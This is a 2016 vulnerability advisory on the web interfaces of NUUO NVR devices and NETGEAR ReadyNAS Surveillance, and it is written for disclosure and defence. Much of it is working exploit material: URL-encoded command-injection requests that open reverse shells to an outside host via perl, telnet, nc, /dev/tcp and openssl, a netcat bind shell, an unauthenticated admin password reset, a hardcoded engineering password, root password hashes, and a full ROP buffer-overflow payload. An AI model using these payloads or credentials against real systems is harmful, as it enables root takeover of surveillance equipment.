>> Multiple vulnerabilities in NUUO NVRmini2 / NVRsolo / Crystal devices and NETGEAR ReadyNAS Surveillance application
>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security (http://www.agileinfosec.co.uk/)
==========================================================================
Disclosure: 04/08/2016 / Last updated: 04/08/2016


>> Background on the affected products:
"NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS functionality. Setup is simple and easy, with automatic port forwarding settings built in. NVRmini 2 supports POS integration, making this the perfect solution for small retail chain stores. NVRmini 2 also comes full equipped as a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping and RAID functions for data protection. Choose NVR and know that your valuable video data is safe, always."
"NVRsolo is NUUO’s answer to hassle free, lightweight NVR system. It is small in size yet able to handle heavy duty tasks. With local HDMI/VGA display and keyboard/mouse input built right into the unit, configuring NVRsolo is easy and simple. Built on solid Linux foundation, we sacrificed nothing except unnecessary bulk to make NVRsolo the award winning standalone NVR solution you have been looking for. NVRsolo's flexibility doesn't end there. For those needing more storage options, we offer 8 bay versions to meet your needs."
"NUUO Crystal™ is the product that represents the next stage in VMS evolution. Rock solid, easily manageable, with powerful recording and viewing options available. Featuring revolutionary modular system structure that is made to handle large project size, NUUO Crystal™ is the ideal choice for your enterprise. Featuring technology that focuses on delivering stable video recording performance, recording failover, and 3rd party integration choice, you will be impressed with the stability and flexible options with NUUO Crystal™."
"(ReadyNAS Surveillance) NETGEAR combines leading storage and switching solutions together with sophisticated network video recording software to provide an affordable and easy to install and manage surveillance solution. Small businesses and corporate branch offices require a secure way to protect physical assets, but may lack deep security expertise or a big budget. A user-friendly NVR system should combine fast and flexible configuration with easy operation. With a few simple steps for installation, the web-based management leads users to configure, monitor and playback video everywhere. UPnP search, auto camera detection and GUI schedule save setting-up time, while the easy drag and drop camera, auto scan, preset point patrolling, and multiple views offer users a prime monitoring experience."


>> Summary:
NUUO is a vendor of Network Video Recording (NVR) systems for surveillance cameras. These NVR are Linux embedded video recording systems that can manage a number of cameras and are used worldwide by public institutions, banks, SME's, etc. They also provide a software package to NETGEAR that adds network video recording and monitoring capabilities to the well known NETGEAR ReadyNAS Network Attached Storage systems.

The web interface contains a number of critical vulnerabilities that can be abused by unauthenticated attackers. These consist of monitoring backdoors left in the PHP files that are supposed to be used by NUUO's engineers, hardcoded credentials, poorly sanitised input and a buffer overflow which can be abused to achieve code execution on NUUO's devices as root, and on NETGEAR as the admin user.

Although only the NVRmini 2, NVRsolo, Crystal and ReadyNAS Surveillance devices are known to be affected, it is likely that the same code is used in other NUUO devices or even other third party devices (the firmware is littered with references to other devices like NUUO Titan). However this has not been confirmed as it was not possible to access all NUUO and third party devices that might be using the same code.

A special thanks to CERT/CC (https://www.cert.org/) for assistance with disclosing the vulnerabilities to the vendors [1]. Metasploit exploits for #1, #2 and #3 have been released.


>> Technical details:
#1
Vulnerability: Improper Input Validation (leading to remote code execution)
CVE-2016-5674
Attack Vector: Remote
Constraints: None, can be exploited by an unauthenticated attacker
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected)
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected

The web inteface contains a hidden file named __debugging_center_utils___.php that improperly sanitises input to the log parameter, which is passed to the PHP system() call (snippet below):

function print_file($file_fullpath_name)
{
    $cmd = "cat " . $file_fullpath_name;
    echo $file_fullpath_name . "\n\n";
    system($cmd);
}

<?php
    if (isset($_GET['log']) && !empty($_GET['log']))
    {
        $file_fullpath_name = constant('LOG_FILE_FOLDER') . '/' . basename($_GET['log']);
        print_file($file_fullpath_name);
    }
    else
    {
        die("unknown command.");
    }
?>

The file can be accessed by an unauthenticated user, and code execution can be achieved with the following proofs of concept:
- ReadyNAS Surveillance:
GET /__debugging_center_utils___.php?log=something%3bperl+-MIO%3a%3aSocket+-e+'$p%3dfork%3bexit,if($p)%3b$c%3dnew+IO%3a%3aSocket%3a%3aINET(PeerAddr,"192.168.1.204%3a9000")%3bSTDIN->fdopen($c,r)%3b$~->fdopen($c,w)%3bsystem$_+while<>%3b'
This will connect a shell back to 192.168.1.204 on port 9000, running as the "admin" user.

- NVRmini 2 and NVRsolo:
GET /__debugging_center_utils___.php?log=something%3btelnet+192.168.1.204+9999+|+bash+|+telnet+192.168.1.204+9998 
This will connect two shells to 192.168.1.204, one on port 9999 and another on port 9998. To execute commands, echo into the 9999 shell, and receive the output on the 9998 shell. Commands will run as the root user.


#2
Vulnerability: Improper Input Validation (leading to remote code execution)
CVE-2016-5675
Attack Vector: Remote
Constraints: Requires an administrator account
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected)
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
- NUUO Crystal, firmware v2.2.1 to v3.2.0 (older firmware versions might be affected)
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected

The handle_daylightsaving.php page does not sanitise input from the NTPServer parameter correctly and passes it to a PHP system() command (code snippet below):
    else if ($act == 'update')
    {
        $cmd = sprintf("/usr/bin/ntpdate %s", $_GET['NTPServer']);
        
        $find_str = "time server";
        
        $sys_msg = system($cmd);
        $pos = strpos($sys_msg, $find_str);

The file can only be accessed by an authenticted user.
- ReadyNAS Surveillance:
GET /handle_daylightsaving.php?act=update&NTPServer=bla%3b+whoami+>+/tmp/test
This will create a /tmp/test file with the contents of "admin" (current user).

- NVRmini 2 and NVRsolo:
GET /handle_daylightsaving.php?act=update&NTPServer=bla%3brm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.1.204+9000+>/tmp/f
Connects a shell to 192.168.1.204, port 9000, running as root.

- Crystal:
GET /handle_daylightsaving.php?act=update&NTPServer=bla%3bbash+-i+>%26+/dev/tcp/192.168.1.204/4444+0>%26
Connects a shell to 192.168.1.204, port 4444, running as root.


#3
Vulnerability: Administrator password reset
CVE-2016-5676
Attack Vector: Remote
Constraints: None, can be exploited by an unauthenticated attacker
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication)
- NUUO NVRsolo, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication)
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected

On older versions of the firmware and in the ReadyNAS Surveillance application unauthenticated users can call the cgi_system binary from the web interface. This binary performs a number of sensitive system commands, such as the loading of the default configuration that resets the administrator password. It seems that at least versions 2.2.1 and 3.0.0 of the NVRmini 2 and NVRsolo firmware are not affected, so this vulnerability was fixed either on these or earlier versions, but ReadyNAS Surveillance is still vulnerable.

Proof of concept:
GET /cgi-bin/cgi_system?cmd=loaddefconfig

This will reset the admin password of the web interface to admin or password (depending on the firmware version) on all affected devices.


#4
Vulnerability: Information disclosure (system processes, available memory and filesystem status)
CVE-2016-5677
Attack Vector: Remote
Constraints: None, can be exploited by an unauthenticated attacker
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected)
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected

The web interface contains a hidden page (__nvr_status___.php) with a hardcoded username and password that lists the current system processes, available memory and filesystem status. This information can be obtained by an unauthenticated user by performing the following request:
POST /__nvr_status___.php HTTP/1.1
username=nuuoeng&password=qwe23622260&submit=Submit


#5 
Vulnerability: Harcoded root password 
CVE-2016-5678
Affected products / versions:
- NUUO NVRmini 2, firmware v1.0.0 to 3.0.0 
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0

The NVRmini 2 and NVRsolo contain two hardcoded root passwords (one is commented). These passwords have not been cracked, but they are present in the firmware images which are deployed to all NVRmini 2 / NVRsolo devices.

NVRmini 2:
  #root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::
  root:$1$vd3TecoS$VyBh4/IsumZkqFU.1wfrV.:14461:0:99999:7:::

NVRsolo:
  #root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::
  root:$1$72ZFYrXC$aDYHvkWBGcRRgCrpSCpiw1:0:0:99999:7:::

  
#6 
Vulnerability: Command injection in cgi_main transfer license command
CVE-2016-5679
Attack Vector: Local / Remote
Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected)
- ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)

The transfer_license command has a command injection vulnerability in the "sn" parameter:
cgi_main?cmd=transfer_license&method=offline&sn=";<command>;#

Sample exploit for NVRmini2 (open bind shell on port 4444):
GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn="%3bnc+-l+-p+4444+-e+/bin/sh+%26+%23

NETGEAR Surveillance doesn't have netcat, but we can get an openssl reverse shell to 192.168.133.204:4444 instead:
GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn="%3bmkfifo+/tmp/s%3b+/bin/bash+-i+<+/tmp/s+2>%261+|+openssl+s_client+-quiet+-connect+192.168.133.204%3a4444+>+/tmp/s%3b+rm+/tmp/s%3b%23

> Local exploitation:
This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command:
CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>'
The cgi_main binary is located at "/apps/surveillance/bin/cgi_main" on the ReadyNAS and "/NUUO/bin/cgi_main" on the NVRmini2.
      
      
#7 
Vulnerability: Stack buffer overflow in cgi_main transfer license command
CVE-2016-5680
Attack Vector: Local / Remote
Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user
- NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected)
- ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)

The "sn" parameter in transfer_license cgi_main method not only has a command injection vulnerability, but also a stack buffer overflow. Below is the pseudocode of the affected function - as it can be seen in the sprintf line, the "sn" parameter is copied directly into a string with a fixed length of 128 characters.

Function 0x20BC9C (NVRmini2 firmware v3.0.0):
      method = getval("method");
      sn = getval("sn");
      (...)
      memset(&command, 0, 128);
      sprintf(&command, "logger -p local0.info -t 'system' \"Activate license: %s\"", sn);
      system(&command);

> For example if the following request is performed:
GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

> A core file is generated:
Core was generated by `/NUUO/bin/cgi_main'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x61616160 in ?? ()
(gdb) i r
r0             0x0	0
r1             0x0	0
r2             0x407aa4d0	1081779408
r3             0x407aa9e0	1081780704
r4             0x61616161	1633771873
r5             0x61616161	1633771873
r6             0x61616161	1633771873
r7             0x61616161	1633771873
r8             0x331fc8	3350472
r9             0x1	1
r10            0x33db54	3398484
r11            0x0	0
r12            0x1	1
sp             0xbedce528	0xbedce528
lr             0x61616161	1633771873
pc             0x61616160	0x61616160
cpsr           0x60000030	1610612784
(gdb) 

The request can be sent by an HTTP GET or POST method.

> A few registers can be controlled with the sn parameter, as it can be seen in the diagram below for the NVRmini2:
sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4444555566667777PPPPaaaaaaaaaaaaSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS

aaaa: filler
PPPP: pc / lr register content, offset 976
4444: r4 register content, offset 962
5555: r5 register content, offset 966
6666: r6 register content, offset 970
7777: r7 register content, offset 974
SSSS: start of stack pointer, offset 992

> On the ReadyNAS Surveillance one additional register (r8) can be controlled:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa44445555666677778888PPPPaaaaaaaaaaaaSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS

aaaa: filler
PPPP: pc / lr register content, offset 986
4444: r4 register content, offset 968
5555: r5 register content, offset 970
6666: r6 register content, offset 974
7777: r7 register content, offset 978
8888: r8 register content, offset 982
SSSS: start of stack pointer, offset 1002

> Exploit mitigations and constraints
The table below shows the exploit mitigation technologies for each target:
         NVRmini2   ReadyNAS
NX          Y          Y
RELRO    Partial    Partial
ASLR        N          Y

An additional constraint to keep in mind is that there can be no null bytes in the exploit as the vulnerability is in the sprintf copy operation (which uses a null byte as the string terminator).

> Exploitation in the NVRmini2 (firmware v3.0.0):
This example exploit creates a root bind shell on port 4444 using ROP gadgets to bypass NX. The gadgets were taken from libc-2.15.so, which is always loaded at 4066c000 in firmware 3.0.0.

0x00018ba0 : pop {r3, lr} ; bx lr -> located at 40684BA0 (first gadget, sets up r3 for the next gadget)
0x000f17cc : mov r0, sp ; blx r3 -> located at 4075D7CC (second gadget, set up args for system)
0x00039ffc : system() -> located at 406A5FFC (takes the argument from r0 - pointing to sp - and executes it)
Payload (in the stack) -> %6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%73%68%20%26 ("nc -l -p 4444 -e /bin/sh &")

Illustration:
sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{first_gadget}aaaaaaaaaaaa{system()_address}{second_gadget}{stack}

Exploit for NVRmini2 firmware v3.0.0 ("sn" parameter value):
sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%a0%4b%68%40aaaaaaaaaaaa%fc%5f%6a%40%cc%d7%75%40%6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%73%68%20%26

